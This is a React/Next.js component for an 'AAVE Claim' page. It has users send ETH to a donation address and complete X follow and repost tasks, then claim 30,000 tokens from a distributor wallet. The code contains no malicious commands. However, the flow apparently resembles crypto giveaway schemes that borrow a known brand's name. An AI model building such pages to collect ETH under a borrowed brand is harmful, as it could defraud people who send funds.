"use client";

import Image from "next/image";
import {
  ArrowRight,
  CheckCircle2,
  Clock3,
  ExternalLink,
  LoaderCircle,
  Lock,
  ShieldCheck,
  Sparkles,
  Wallet,
} from "lucide-react";
import { useCallback, useEffect, useMemo, useState } from "react";
import { formatEther } from "viem";
import { useAccount } from "wagmi";
import { ConnectWalletButton } from "@/components/connect-wallet-button";
import {
  CLAIM_REWARD_TOKENS,
  DONATION_RECIPIENT,
  SOCIAL_TASKS,
  type SocialTaskId,
} from "@/lib/content";
import {
  EMPTY_ADDRESS_STATE,
  canVerifyTask,
  getTaskCooldownRemaining,
  type AddressQuestState,
  type GlobalMintLedger,
} from "@/lib/mint";

type Notice = {
  tone: "success" | "error" | "info";
  message: string;
};

type SnapshotApiResponse = {
  ok: boolean;
  state: AddressQuestState;
  globalLedger: GlobalMintLedger;
  error?: string;
};

type ClaimConfig = {
  enabled: boolean;
  tokenContractAddress: `0x${string}` | null;
  distributorWalletAddress: `0x${string}` | null;
  amount: number;
  chainId: number;
  chainName: string;
};

type ClaimConfigResponse = {
  ok: boolean;
  config: ClaimConfig;
};

function shortAddress(value: string | null | undefined) {
  if (!value) {
    return "Not configured";
  }

  return `${value.slice(0, 6)}...${value.slice(-4)}`;
}

function formatWei(value: string) {
  try {
    return `${Number(formatEther(BigInt(value))).toLocaleString("en-US", {
      maximumFractionDigits: 6,
    })} ETH`;
  } catch {
    return "0 ETH";
  }
}

function SectionBadge({ children }: { children: React.ReactNode }) {
  return (
    <span className="section-badge">
      <span className="pulse-dot" />
      {children}
    </span>
  );
}

function StatusPill({
  done,
  pendingLabel = "Pending",
}: {
  done: boolean;
  pendingLabel?: string;
}) {
  return (
    <span className={`status-pill ${done ? "status-pill-done" : ""}`}>
      {done ? <CheckCircle2 className="h-3.5 w-3.5" /> : <Clock3 className="h-3.5 w-3.5" />}
      {done ? "Verified" : pendingLabel}
    </span>
  );
}

function StepCard({
  index,
  title,
  description,
  done,
  children,
}: {
  index: string;
  title: string;
  description: string;
  done: boolean;
  children: React.ReactNode;
}) {
  return (
    <article className={`claim-card ${done ? "claim-card-done" : ""}`}>
      <div className="flex items-start justify-between gap-4">
        <div className="flex items-start gap-4">
          <span className="step-index">{index}</span>
          <div>
            <h3 className="text-lg font-semibold text-slate-950">{title}</h3>
            <p className="mt-2 text-sm leading-6 text-slate-500">{description}</p>
          </div>
        </div>
        <StatusPill done={done} />
      </div>
      <div className="mt-6">{children}</div>
    </article>
  );
}

export function HomeShell() {
  const { address, isConnected } = useAccount();
  const [state, setState] = useState<AddressQuestState>(
    EMPTY_ADDRESS_STATE("AAVE support claim")
  );
  const [claimConfig, setClaimConfig] = useState<ClaimConfig | null>(null);
  const [notice, setNotice] = useState<Notice | null>(null);
  const [now, setNow] = useState(() => Date.now());
  const [verifyingDonation, setVerifyingDonation] = useState(false);
  const [verifyingTask, setVerifyingTask] = useState<SocialTaskId | null>(null);
  const [claiming, setClaiming] = useState(false);

  const socialComplete = SOCIAL_TASKS.every((task) => state.social[task.id].verified);
  const eligible = state.donation.verified && socialComplete;
  const claimLocked =
    state.claim.status === "submitting" ||
    state.claim.status === "submitted" ||
    state.claim.status === "confirmed";
  const claimDisabled = !isConnected || !eligible || claimLocked || claiming;

  const completedSteps = useMemo(() => {
    return [
      state.donation.verified,
      state.social.follow.verified,
      state.social.quote.verified,
      state.claim.status === "confirmed",
    ].filter(Boolean).length;
  }, [state]);

  const applySnapshot = useCallback((payload: SnapshotApiResponse) => {
    setState(payload.state);
  }, []);

  const refreshState = useCallback(async (nextAddress?: string | null) => {
    const search = nextAddress ? `?address=${encodeURIComponent(nextAddress)}` : "";

    try {
      const response = await fetch(`/api/state${search}`);
      const payload = (await response.json()) as SnapshotApiResponse;

      if (!response.ok || !payload.ok) {
        throw new Error(payload.error || "State sync failed.");
      }

      applySnapshot(payload);
    } catch {
      if (!nextAddress) {
        setState(EMPTY_ADDRESS_STATE("AAVE support claim"));
      }
    }
  }, [applySnapshot]);

  function ensureWallet() {
    if (isConnected && address) {
      return true;
    }

    setNotice({
      tone: "info",
      message: "Connect a wallet first so the checks can bind to your address.",
    });
    return false;
  }

  async function handleVerifyDonation() {
    if (!ensureWallet() || !address || verifyingDonation) {
      return;
    }

    setVerifyingDonation(true);
    setNotice({
      tone: "info",
      message: "Checking native ETH transfers to the donation address.",
    });

    try {
      const response = await fetch("/api/tasks/donation/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address }),
      });
      const payload = (await response.json()) as SnapshotApiResponse & {
        donation?: { verified: boolean; totalEth: string };
      };

      if (!response.ok || !payload.ok) {
        throw new Error(payload.error || "Donation verification failed.");
      }

      applySnapshot(payload);
      setNotice({
        tone: payload.donation?.verified ? "success" : "error",
        message: payload.donation?.verified
          ? "Donation transfer found. Claim eligibility task 1 is complete."
          : "No qualifying ETH transfer was found for this wallet yet.",
      });
    } catch (error) {
      setNotice({
        tone: "error",
        message:
          error instanceof Error ? error.message : "Donation verification failed.",
      });
    } finally {
      setVerifyingDonation(false);
    }
  }

  async function handleLaunchSocialTask(taskId: SocialTaskId) {
    if (!ensureWallet() || !address) {
      return;
    }

    const task = SOCIAL_TASKS.find((item) => item.id === taskId);
    if (!task) {
      return;
    }

    window.open(task.href, "_blank", "noopener,noreferrer");

    const response = await fetch("/api/tasks/social/launch", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address, taskId }),
    });
    const payload = (await response.json()) as SnapshotApiResponse;

    if (response.ok && payload.ok) {
      applySnapshot(payload);
      setNotice({
        tone: "info",
        message: "The X page is open. Come back after the cooldown to verify.",
      });
    }
  }

  async function handleVerifySocialTask(taskId: SocialTaskId) {
    if (!ensureWallet() || !address || verifyingTask) {
      return;
    }

    const progress = state.social[taskId];
    if (!canVerifyTask(progress.launchedAt, now) || progress.verified) {
      return;
    }

    setVerifyingTask(taskId);

    try {
      const response = await fetch("/api/tasks/social/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address, taskId }),
      });
      const payload = (await response.json()) as SnapshotApiResponse;

      if (!response.ok || !payload.ok) {
        throw new Error(payload.error || "X task verification failed.");
      }

      applySnapshot(payload);
      setNotice({
        tone: "success",
        message:
          taskId === "follow"
            ? "Follow task verified."
            : "Repost task verified.",
      });
    } catch (error) {
      setNotice({
        tone: "error",
        message:
          error instanceof Error ? error.message : "X task verification failed.",
      });
    } finally {
      setVerifyingTask(null);
    }
  }

  async function handleClaim() {
    if (!ensureWallet() || !address || claimDisabled) {
      return;
    }

    setClaiming(true);
    setNotice({
      tone: "info",
      message: "Submitting the token transfer from the distributor wallet.",
    });

    try {
      const response = await fetch("/api/claim", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address }),
      });
      const payload = (await response.json()) as SnapshotApiResponse & {
        config?: ClaimConfig;
      };

      if (!response.ok || !payload.ok) {
        throw new Error(payload.error || "Claim failed.");
      }

      applySnapshot(payload);
      if (payload.config) {
        setClaimConfig(payload.config);
      }
      setNotice({
        tone: "success",
        message: `${CLAIM_REWARD_TOKENS.toLocaleString("en-US")} tokens have been sent to your wallet.`,
      });
    } catch (error) {
      await refreshState(address);
      setNotice({
        tone: "error",
        message: error instanceof Error ? error.message : "Claim failed.",
      });
    } finally {
      setClaiming(false);
    }
  }

  useEffect(() => {
    const timer = window.setInterval(() => setNow(Date.now()), 250);
    return () => window.clearInterval(timer);
  }, []);

  useEffect(() => {
    const frame = window.requestAnimationFrame(() => {
      void refreshState(address?.toLowerCase() ?? null);
    });

    return () => window.cancelAnimationFrame(frame);
  }, [address, refreshState]);

  useEffect(() => {
    fetch("/api/claim")
      .then((response) => response.json())
      .then((payload: ClaimConfigResponse) => {
        if (payload.ok) {
          setClaimConfig(payload.config);
        }
      })
      .catch(() => {
        setClaimConfig(null);
      });
  }, []);

  useEffect(() => {
    if (!notice) {
      return;
    }

    const timer = window.setTimeout(() => setNotice(null), 4500);
    return () => window.clearTimeout(timer);
  }, [notice]);

  return (
    <div className="min-h-screen bg-[var(--background)] text-slate-950">
      <header className="sticky top-0 z-40 border-b border-slate-200/80 bg-[rgba(250,250,250,0.82)] backdrop-blur-xl">
        <div className="mx-auto flex max-w-6xl items-center justify-between gap-4 px-4 py-4 md:px-6">
          <a href="#" className="flex items-center gap-3">
            <span className="logo-mark">
              <Image
                src="/mini-asteroid-logo.png"
                alt="Claim logo"
                fill
                priority
                sizes="44px"
                className="object-contain"
              />
            </span>
            <span>
              <span className="block text-sm font-semibold text-slate-950">
                AAVE Claim
              </span>
              <span className="block font-mono text-[11px] uppercase text-slate-500">
                Donation gated
              </span>
            </span>
          </a>
          <ConnectWalletButton />
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-4 pb-20 pt-10 md:px-6 md:pt-14">
        {notice ? (
          <div className={`notice notice-${notice.tone}`}>
            {notice.tone === "success" ? (
              <CheckCircle2 className="h-5 w-5" />
            ) : notice.tone === "error" ? (
              <Lock className="h-5 w-5" />
            ) : (
              <Sparkles className="h-5 w-5" />
            )}
            <p>{notice.message}</p>
          </div>
        ) : null}

        <section className="hero-grid">
          <div className="hero-copy">
            <SectionBadge>Live eligibility check</SectionBadge>
            <h1>
              Donation proof unlocks the{" "}
              <span className="gradient-text">30000 token claim</span>
            </h1>
            <p>
              Connect a wallet, verify the onchain ETH transfer to the donation
              address, finish two X confirmations, then claim once from the
              configured distributor wallet.
            </p>
            <div className="hero-actions">
              <a className="primary-button" href="#tasks">
                Start verification
                <ArrowRight className="h-4 w-4" />
              </a>
              <a
                className="secondary-button"
                href={`https://etherscan.io/address/${DONATION_RECIPIENT}`}
                target="_blank"
                rel="noreferrer"
              >
                Donation address
                <ExternalLink className="h-4 w-4" />
              </a>
            </div>
          </div>

          <div className="hero-visual" aria-label="Claim status summary">
            <div className="hero-media">
              <Image
                src="/space-bg.jpg"
                alt="Space background"
                fill
                priority
                sizes="(max-width: 768px) 100vw, 460px"
                className="object-cover"
              />
            </div>
            <div className="floating-panel floating-panel-a">
              <span className="mini-icon">
                <ShieldCheck className="h-4 w-4" />
              </span>
              <div>
                <p className="font-mono text-[11px] uppercase text-slate-500">
                  Progress
                </p>
                <p className="text-lg font-semibold text-slate-950">
                  {completedSteps}/4 complete
                </p>
              </div>
            </div>
            <div className="floating-panel floating-panel-b">
              <span className="mini-icon">
                <Wallet className="h-4 w-4" />
              </span>
              <div>
                <p className="font-mono text-[11px] uppercase text-slate-500">
                  Reward
                </p>
                <p className="text-lg font-semibold text-slate-950">
                  {CLAIM_REWARD_TOKENS.toLocaleString("en-US")}
                </p>
              </div>
            </div>
          </div>
        </section>

        <section id="tasks" className="mt-8 grid gap-5 lg:grid-cols-[1fr_0.9fr]">
          <div className="space-y-5">
            <StepCard
              index="01"
              title="Verify ETH donation"
              description={`A real indexer query checks native ETH transfers to ${shortAddress(
                DONATION_RECIPIENT
              )}. Any non-zero amount qualifies.`}
              done={state.donation.verified}
            >
              <div className="task-actions">
                <button
                  type="button"
                  className="primary-button"
                  disabled={!isConnected || verifyingDonation || state.donation.verified}
                  onClick={handleVerifyDonation}
                >
                  {verifyingDonation ? (
                    <LoaderCircle className="h-4 w-4 animate-spin" />
                  ) : (
                    <ShieldCheck className="h-4 w-4" />
                  )}
                  {state.donation.verified ? "Donation verified" : "Verify donation"}
                </button>
                <div className="task-meta">
                  <span>Total found: {formatWei(state.donation.totalWei)}</span>
                  <span>Tx: {shortAddress(state.donation.txHash)}</span>
                </div>
              </div>
            </StepCard>

            <StepCard
              index="02"
              title="Complete X confirmations"
              description="Open each X task. Verification unlocks after a 3 second cooldown."
              done={socialComplete}
            >
              <div className="grid gap-3">
                {SOCIAL_TASKS.map((task) => {
                  const progress = state.social[task.id];
                  const remaining = getTaskCooldownRemaining(progress.launchedAt, now);
                  const verifyReady = canVerifyTask(progress.launchedAt, now);
                  const verifyDisabled =
                    progress.verified || !verifyReady || verifyingTask === task.id;

                  return (
                    <div className="social-task" key={task.id}>
                      <div>
                        <p className="font-semibold text-slate-950">{task.title}</p>
                        <p className="mt-1 text-sm text-slate-500">{task.description}</p>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        <button
                          type="button"
                          className="secondary-button"
                          disabled={!isConnected || progress.verified}
                          onClick={() => void handleLaunchSocialTask(task.id)}
                        >
                          Open
                          <ExternalLink className="h-4 w-4" />
                        </button>
                        <button
                          type="button"
                          className="primary-button"
                          disabled={!isConnected || verifyDisabled}
                          onClick={() => void handleVerifySocialTask(task.id)}
                        >
                          {verifyingTask === task.id ? (
                            <LoaderCircle className="h-4 w-4 animate-spin" />
                          ) : progress.verified ? (
                            <CheckCircle2 className="h-4 w-4" />
                          ) : (
                            <Clock3 className="h-4 w-4" />
                          )}
                          {progress.verified
                            ? "Verified"
                            : verifyReady
                              ? "Verify"
                              : `${Math.ceil(remaining / 1000)}s`}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            </StepCard>
          </div>

          <aside className="claim-panel">
            <SectionBadge>Claim</SectionBadge>
            <h2>One wallet. One claim.</h2>
            <p>
              Once both task groups are verified, the server sends{" "}
              {CLAIM_REWARD_TOKENS.toLocaleString("en-US")} ERC-20 tokens to
              your connected address. No user token approval is requested.
            </p>

            <div className="claim-meter">
              <div>
                <span>Donation</span>
                <StatusPill done={state.donation.verified} />
              </div>
              <div>
                <span>Follow X</span>
                <StatusPill done={state.social.follow.verified} />
              </div>
              <div>
                <span>Repost X</span>
                <StatusPill done={state.social.quote.verified} />
              </div>
            </div>

            <button
              type="button"
              className="claim-button"
              disabled={claimDisabled}
              onClick={() => void handleClaim()}
            >
              {claiming || state.claim.status === "submitting" ? (
                <LoaderCircle className="h-5 w-5 animate-spin" />
              ) : state.claim.status === "confirmed" ? (
                <CheckCircle2 className="h-5 w-5" />
              ) : (
                <Sparkles className="h-5 w-5" />
              )}
              {state.claim.status === "confirmed"
                ? "Claimed"
                : state.claim.status === "submitted"
                  ? "Submitted"
                  : `Claim ${CLAIM_REWARD_TOKENS.toLocaleString("en-US")}`}
            </button>

            <div className="config-list">
              <div>
                <span>Token CA</span>
                <strong>{shortAddress(claimConfig?.tokenContractAddress)}</strong>
              </div>
              <div>
                <span>Distributor</span>
                <strong>{shortAddress(claimConfig?.distributorWalletAddress)}</strong>
              </div>
              <div>
                <span>Status</span>
                <strong>{claimConfig?.enabled ? "Ready" : "Needs env"}</strong>
              </div>
              <div>
                <span>Claim Tx</span>
                <strong>{shortAddress(state.claim.txHash)}</strong>
              </div>
            </div>

            {state.claim.errorMessage ? (
              <p className="mt-4 rounded-lg border border-rose-200 bg-rose-50 px-4 py-3 text-sm leading-6 text-rose-700">
                {state.claim.errorMessage}
              </p>
            ) : null}
          </aside>
        </section>
      </main>
    </div>
  );
}
